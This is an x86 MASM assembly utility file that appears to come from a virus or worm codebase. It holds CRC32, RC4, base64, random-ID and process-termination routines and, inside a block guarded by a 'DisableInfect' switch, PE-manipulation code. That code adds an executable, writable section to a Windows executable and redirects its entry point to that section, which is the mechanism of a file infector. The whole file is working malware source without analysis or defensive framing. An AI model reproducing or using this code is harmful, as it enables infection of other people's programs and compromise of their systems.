; Utils
; #########################################################################

.data?
        dwRandSeed              dd      ?
        CRCPoly                 equ     0EDB88320h ; PK-ZIP polynominal
        CRCTable                dd      256 dup(?)

.code

; Create CRC32 table
CRC32BuildTable proc
        xor     eax, eax
@a_gen:
        mov     edx, eax
        shl     edx, 1

        push    9
        pop     ecx
@l:
        shr     edx, 1
        jnc     @no_xor
        xor     edx, CRCPoly
@no_xor:
        loop    @l

        mov     dword ptr[CRCTable+eax*4], edx
        inc     al
        jnz     @a_gen
        ret
CRC32BuildTable endp

; Update CRC32 value, initially Crc32 should set to 0
CRC32UpdateRar proc uses esi Crc32, Buf, BufLen: DWORD
        mov     eax, Crc32
        mov     esi, Buf
        mov     ecx, BufLen
        jecxz   @no_data

@loop:
        mov     edx, eax
        shr     edx, 8
        xor     al, byte ptr[esi]
        and     eax, 0ffh
        mov     eax, dword ptr[CRCTable+eax*4]
        xor     eax, edx
        inc     esi
        loop    @loop

@no_data:
        ret
CRC32UpdateRar endp

; Update CRC32 value, initially Crc32 should set to 0
CRC32Update proc Crc32, Buf, BufLen: DWORD
        mov     eax, Crc32
        not     eax
        invoke  CRC32UpdateRar, eax, Buf, BufLen
        not     eax
        ret
CRC32Update endp

; Calc file checksum
CRC32File proc Handle: DWORD
        LOCAL   buf, bRead, crc32: DWORD

        invoke  GlobalAlloc, GMEM_FIXED, 8192
        mov     buf, eax

        mov     crc32, 0
        invoke  SetFilePointer, Handle, 0, NULL, FILE_BEGIN
@l:
        invoke  ReadFile, Handle, buf, 8192, addr bRead, NULL
        .IF     (bRead == 0)
                jmp     @e
        .ENDIF
        invoke  CRC32Update, crc32, buf, bRead
        mov     crc32, eax
        jmp     @l

@e:
        invoke  GlobalFree, buf
        invoke  SetFilePointer, Handle, 0, NULL, FILE_BEGIN
        mov     eax, crc32
        ret
CRC32File endp

; Initialize random generator
Randomize proc
        invoke  GetTickCount
        mov     dwRandSeed, eax
        ret
Randomize endp

; Rand returns random number from [0..N-1] set
Rand proc N: DWORD
        xor     eax, eax
        .IF     (N < 2)
                ret
        .ENDIF
        invoke  CRC32Update, eax, offset dwRandSeed, 4
        inc     dwRandSeed
        not     eax
        xor     dwRandSeed, eax
        not     eax
        xor     edx, edx
        div     N
        xchg    eax, edx
        ret
Rand endp

; Fill memory of the given Len pointed by lpMem with NULLs
ZeroMemory proc uses edi lpMem, Len: DWORD
        cld
        mov     edi, lpMem
        mov     ecx, Len
        shr     ecx, 2
        xor     eax, eax
        rep stosd
        mov     ecx, Len
        and     ecx, 3
        rep stosb
        ret
ZeroMemory endp

; Generate random chars of a given length
GetRandomID proc uses edi ebx lpOutput, dwLen: DWORD
        mov     ebx, dwLen
        mov     edi, lpOutput

@loop:
        invoke  Rand, 'z'-'a'+1
        add     eax, 'a'
        cld
        stosb
        dec     ebx
        jnz     @loop

        ret
GetRandomID endp

; Generate random number of a given length
GetRandomNumID proc uses edi ebx lpOutput, dwLen: DWORD
        mov     ebx, dwLen
        mov     edi, lpOutput

@loop:
        invoke  Rand, '9'-'0'+1
        add     eax, '0'
        cld
        stosb
        dec     ebx
        jnz     @loop

        ret
GetRandomNumID endp

; Terminate process
KillProcess proc ID: DWORD
        invoke  OpenProcess, PROCESS_TERMINATE, 0, ID
        .IF     eax
                push    eax
                invoke  TerminateProcess, eax, 0
                call    CloseHandle
        .ENDIF
        ret
KillProcess endp

; Encodes data to base64 format
Base64Encode proc uses esi edi ebx lpSrc, lpDst, dwSrcLen: DWORD
        mov     esi, lpSrc
        mov     edi, lpDst
        mov     ecx, dwSrcLen

        xor     ebx, ebx

@l:
        jecxz   @b64_ret

        lodsb
        shl     eax, 16
        cmp     ecx, 1
        jz      @work
        lodsb
        shl     ax, 8
        cmp     ecx, 2
        jz      @work
        lodsb

@work:
        ; Output b64 quad
        mov     edx, eax
        ror     edx, 24

        push    ecx
        push    4
        pop     ecx
@l2:
        call    @b64_write
        loop    @l2
        pop     ecx

        inc     ebx
        .IF     ebx == 18
                xor     ebx, ebx
                mov     ax, 0a0dh
                stosw
        .ENDIF

        sub     ecx, 3
        jns     @l

        ; Pad
        neg     ecx
        sub     edi, ecx
        mov     al, '='
        rep stosb

@b64_ret:
        ret

@b64_write:
        rol     edx, 6
        mov     eax, edx
        and     al, 00111111b
        cmp     al, 62
        jae     @write_spec

        cmp     al, 52
        jae     @write_number

        ; Uppercase
        add     al, 'A'
        cmp     al, 'A'+26
        jb      @write
        ; Lowercase
        add     al, 6
        jmp     @write
        ; Number
@write_number:
        add     al, '0'-52
        jmp     @write
        ; Special: +/
@write_spec:
        sub     al, 62
        shl     al, 2
        add     al, 43        
@write:
        stosb
                
        retn
Base64Encode endp

; Load dll functions
PayLoadDll proc uses ebx esi edi szLib, dwFuncs: DWORD
        invoke  LoadLibrary, szLib
        test    eax, eax
        jz      @plg_err

        mov     ebx, eax
        mov     edi, szLib
        mov     esi, dwFuncs
@l:
        cld
        xor     eax, eax
        or      ecx, -1
        repnz scasb                
        cmp     byte ptr[edi], 0
        jz      @e
        invoke  GetProcAddress, ebx, edi
        .IF     !eax
                ret
        .ENDIF
        mov     dword ptr[esi], eax
        add     esi, 4
        jmp     @l
@e:
        mov     eax, 1
@plg_err:
        ret
PayLoadDll endp

; RC4 Cipher
; #########################################################################

rc4_state struct
    x   BYTE   ?
    y   BYTE   ?
    m   BYTE   256 dup(?)
rc4_state ends

; Reset RC4 state, initialize encryption key
RC4Setup proc uses esi edi ebx state, key, len: DWORD
        LOCAL   a: BYTE
        LOCAL   j: BYTE

        invoke  ZeroMemory, state, sizeof rc4_state
        mov     edi, state
        inc     edi
        inc     edi             ; m
        
        xor     edx, edx
        mov     ecx, 256
@l:
        mov     byte ptr[edi+edx], dl
        inc     dl
        loop    @l

        mov     edi, state
        inc     edi
        inc     edi             ; m
        mov     esi, key

        mov     j, 0
        xor     ecx, ecx        ; k
        xor     ebx, ebx        ; i

@l_gen:
        mov     al, byte ptr[edi+ebx]
        mov     a, al

        add     j, al
        mov     al, byte ptr[esi+ecx]
        add     j, al

        movzx   edx, j
        mov     al, byte ptr[edi+edx]
        mov     byte ptr[edi+ebx], al
        mov     al, a
        mov     byte ptr[edi+edx], al

        inc     ecx
        .IF     ecx >= len
                xor     ecx, ecx
        .ENDIF
        inc     bl
        jnz     @l_gen
        ret
RC4Setup endp

; Crypt data using RC4 algorithm & update the state
RC4Crypt proc uses ebx esi edi state, cdata, len: DWORD
        LOCAL   a: BYTE
        LOCAL   b: BYTE
        LOCAL   x: BYTE
        LOCAL   y: BYTE
        LOCAL   i: DWORD

        mov     ebx, state
        assume  ebx: ptr rc4_state
        mov     al, [ebx].x
        mov     x, al
        mov     al, [ebx].y
        mov     y, al
        mov     edi, ebx
        inc     edi
        inc     edi

        mov     esi, cdata

        mov     i, 0

        mov     ecx, len
        jecxz   @no_data

@l:
        ; x = (unsigned char) ( x + 1 ); a = m[x];
        inc     x
        movzx   eax, x
        movzx   edx, byte ptr[edi+eax]   ; a
        mov     a, dl

        ; y = (unsigned char) ( y + a );
        add     y, dl

        ; m[x] = b = m[y];
        movzx   eax, y
        mov     dl, byte ptr[edi+eax]
        mov     b, dl
        movzx   eax, x
        mov     byte ptr[edi+eax], dl

        ; m[y] = a;
        movzx   eax, y
        mov     dl, a
        mov     byte ptr[edi+eax], dl

        ; data[i] ^= m[(unsigned char) ( a + b )];
        mov     dl, a
        add     dl, b
        mov     dl, byte ptr[edi+edx]
        mov     eax, i
        xor     byte ptr[esi+eax], dl

        inc     i
        loop    @l

@no_data:
        mov     al, x
        mov     byte ptr[ebx], al
        mov     al, y
        mov     byte ptr[ebx+1], al
        ret
RC4Crypt endp

IFNDEF  DisableInfect
;---- STRUCTs ----
sSEH struct
        OrgEsp            dd ?
        OrgEbp            dd ?
        SaveEip           dd ?
sSEH ends

; Used in macro
SehHandler proc C pExcept:DWORD,pFrame:DWORD,pContext:DWORD,pDispatch:DWORD
        MOV  EAX, pContext

        IFDEF SehStruct
        PUSH SEH.SaveEip
        POP  [EAX][CONTEXT.regEip]
        PUSH SEH.OrgEsp
        POP  [EAX][CONTEXT.regEsp]
        PUSH SEH.OrgEbp
        POP  [EAX][CONTEXT.regEbp]
        ENDIF

        MOV  EAX, ExceptionContinueExecution

        RET
SehHandler endp

InstSehFrame macro ContinueAddr
        assume fs: nothing
        
        IFNDEF  SehStruct
                SehStruct equ 1

                .data
                        SEH    sSEH <>

                .code
        ENDIF
   
        mov  SEH.SaveEip, ContinueAddr
        mov  SEH.OrgEbp, ebp
        push offset SehHandler
        push fs:[0]
        mov  SEH.OrgEsp, esp
        mov  fs:[0], esp
endm

KillSehFrame macro
        pop  fs:[0]
        add  esp, 4
endm
ENDIF

PEPtrA macro V
        mov     V, lpFile
        mov     V, dword ptr[V+3ch]
        add     V, lpFile
endm

PEPtrB macro V, B
        mov     V, B
        mov     V, dword ptr[V+3ch]
        add     V, B
endm

SectionHead struct
        ObjName         BYTE    8 dup(?)
        VirtSize        DWORD   ?
        RVA             DWORD   ?
        PhysSize        DWORD   ?
        PhysOffs        DWORD   ?
        Reserved        BYTE    0ch dup(?)
        Flags           DWORD   ?
SectionHead ends

SectionCount proc lpFile: DWORD
        PEPtrA  eax
        movzx   eax, word ptr[eax+06h]
        ret
SectionCount endp

SectionHeadPtr proc Num, lpFile: DWORD
        ; Num * 28h
        xor     edx, edx
        mov     eax, 28h ; obj table size
        mul     Num

        ; ...+ PE + 0f8h
        PEPtrA  edx
        add     eax, edx
        add     eax, 0f8h ; size of PE header
        ret
SectionHeadPtr endp

SectionDataPtr proc Num, lpFile: DWORD
        invoke  SectionHeadPtr, Num, lpFile
        mov     eax, [eax][SectionHead.PhysOffs]
        add     eax, lpFile
        ret
SectionDataPtr endp

SectionPhysSize proc Num, lpFile: DWORD
        invoke  SectionHeadPtr, Num, lpFile
        mov     eax, [eax][SectionHead.PhysSize]
        ret
SectionPhysSize endp

; Creates new section header
AddEPSection proc uses ebx lpFile, dwSize, MakeOEP: DWORD
        LOCAL   NewRVA, NewPhysOffs: DWORD

        invoke  SectionCount, lpFile
        dec     eax
        invoke  SectionHeadPtr, eax, lpFile
        mov     ebx, eax

        ; This chunk can be optimized, w/o using of div (too lazy to think on)
        PEPtrA  ecx
        mov     ecx, dword ptr[ecx+38h] ; Object Align
        xor     edx, edx
        mov     eax, [ebx][SectionHead.VirtSize]
        div     ecx
        sub     ecx, edx

        mov     edx, [ebx][SectionHead.VirtSize]
        add     edx, ecx
        add     edx, [ebx][SectionHead.RVA]
        mov     NewRVA, edx

        m2m     NewPhysOffs, [ebx][SectionHead.PhysSize]
        mov     eax, [ebx][SectionHead.PhysOffs]
        add     NewPhysOffs, eax

        invoke  SectionCount, lpFile
        invoke  SectionHeadPtr, eax, lpFile
        mov     ebx, eax

        invoke  ZeroMemory, eax, 28h

        ; Write header data
        m2m     [ebx][SectionHead.VirtSize], dwSize
        m2m     [ebx][SectionHead.PhysSize], dwSize
        m2m     [ebx][SectionHead.PhysOffs], NewPhysOffs
        m2m     [ebx][SectionHead.RVA], NewRVA
        mov     [ebx][SectionHead.Flags], 0E0000020h

        ; Increment section count
        PEPtrA  eax
        inc     word ptr[eax+06h]

        ; ImageSize
        m2m     dword ptr[eax+50h], NewRVA
        mov     edx, dwSize
        add     dword ptr[eax+50h], edx

        ; Remove BoundImport
        mov     dword ptr[eax+0d0h], 0
        mov     dword ptr[eax+0d4h], 0

        ; Write entry point
        .IF     MakeOEP
                m2m     dword ptr[eax+28h], NewRVA
        .ELSE
                mov     eax, NewRVA
        .ENDIF
        ret
AddEPSection endp
